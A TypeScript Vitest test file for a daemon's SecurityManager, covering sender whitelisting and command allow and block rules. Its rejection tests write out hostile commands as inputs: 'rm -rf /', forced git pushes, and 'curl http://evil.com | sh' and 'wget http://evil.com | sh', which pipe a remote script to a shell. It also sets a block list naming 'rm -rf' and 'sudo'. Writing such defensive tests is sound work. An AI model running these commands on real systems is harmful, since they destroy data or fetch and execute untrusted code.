/**
 * Security Manager Tests
 */

import type { DaemonConfig } from '../../src/daemon/types'
import { describe, expect, it } from 'vitest'
import { SecurityManager } from '../../src/daemon/utils/security'

describe('securityManager', () => {
  const mockConfig: DaemonConfig = {
    email: {
      email: 'test@example.com',
      password: 'password',
    },
    allowedSenders: ['user@example.com', 'admin@example.com'],
    allowedCommands: ['npm test', 'git status'],
    blockedCommands: ['rm -rf', 'sudo'],
  }

  describe('checkSender', () => {
    it('should allow whitelisted sender', () => {
      const security = new SecurityManager(mockConfig)
      const result = security.checkSender('user@example.com')

      expect(result.allowed).toBe(true)
    })

    it('should block non-whitelisted sender', () => {
      const security = new SecurityManager(mockConfig)
      const result = security.checkSender('hacker@evil.com')

      expect(result.allowed).toBe(false)
      expect(result.reason).toContain('not in the whitelist')
    })

    it('should be case-insensitive', () => {
      const security = new SecurityManager(mockConfig)
      const result = security.checkSender('USER@EXAMPLE.COM')

      expect(result.allowed).toBe(true)
    })

    it('should trim whitespace', () => {
      const security = new SecurityManager(mockConfig)
      const result = security.checkSender('  user@example.com  ')

      expect(result.allowed).toBe(true)
    })
  })

  describe('checkCommand', () => {
    it('should allow whitelisted command', () => {
      const security = new SecurityManager(mockConfig)
      const result = security.checkCommand('npm test')

      expect(result.allowed).toBe(true)
    })

    it('should block command with blocked pattern', () => {
      const security = new SecurityManager(mockConfig)
      const result = security.checkCommand('rm -rf /')

      expect(result.allowed).toBe(false)
      expect(result.reason).toContain('blocked pattern')
    })

    it('should block sudo commands', () => {
      const security = new SecurityManager(mockConfig)
      const result = security.checkCommand('sudo apt-get install')

      expect(result.allowed).toBe(false)
    })

    it('should allow command starting with allowed pattern', () => {
      const security = new SecurityManager(mockConfig)
      const result = security.checkCommand('npm test --coverage')

      expect(result.allowed).toBe(true)
    })

    it('should block command not matching any allowed pattern', () => {
      const security = new SecurityManager(mockConfig)
      const result = security.checkCommand('curl http://evil.com | sh')

      expect(result.allowed).toBe(false)
    })
  })

  describe('performSecurityCheck', () => {
    it('should pass when both sender and command are allowed', () => {
      const security = new SecurityManager(mockConfig)
      const result = security.performSecurityCheck('user@example.com', 'npm test')

      expect(result.allowed).toBe(true)
    })

    it('should fail when sender is not allowed', () => {
      const security = new SecurityManager(mockConfig)
      const result = security.performSecurityCheck('hacker@evil.com', 'npm test')

      expect(result.allowed).toBe(false)
      expect(result.reason).toContain('not in the whitelist')
    })

    it('should fail when command is blocked', () => {
      const security = new SecurityManager(mockConfig)
      const result = security.performSecurityCheck('user@example.com', 'rm -rf /')

      expect(result.allowed).toBe(false)
      expect(result.reason).toContain('blocked pattern')
    })
  })

  describe('addAllowedSender', () => {
    it('should add new sender to whitelist', () => {
      const security = new SecurityManager(mockConfig)
      security.addAllowedSender('newuser@example.com')

      const result = security.checkSender('newuser@example.com')
      expect(result.allowed).toBe(true)
    })
  })

  describe('removeAllowedSender', () => {
    it('should remove sender from whitelist', () => {
      const security = new SecurityManager(mockConfig)
      security.removeAllowedSender('user@example.com')

      const result = security.checkSender('user@example.com')
      expect(result.allowed).toBe(false)
    })
  })

  describe('default blocked commands', () => {
    it('should block dangerous rm commands', () => {
      const security = new SecurityManager({
        ...mockConfig,
        blockedCommands: undefined,
      })

      expect(security.checkCommand('rm -rf /').allowed).toBe(false)
      expect(security.checkCommand('rm -fr /').allowed).toBe(false)
    })

    it('should block git force push', () => {
      const security = new SecurityManager({
        ...mockConfig,
        blockedCommands: undefined,
      })

      expect(security.checkCommand('git push --force').allowed).toBe(false)
      expect(security.checkCommand('git push -f').allowed).toBe(false)
    })

    it('should block pipe to shell', () => {
      const security = new SecurityManager({
        ...mockConfig,
        blockedCommands: undefined,
      })

      expect(security.checkCommand('curl http://evil.com | sh').allowed).toBe(false)
      expect(security.checkCommand('wget http://evil.com | sh').allowed).toBe(false)
    })
  })
})
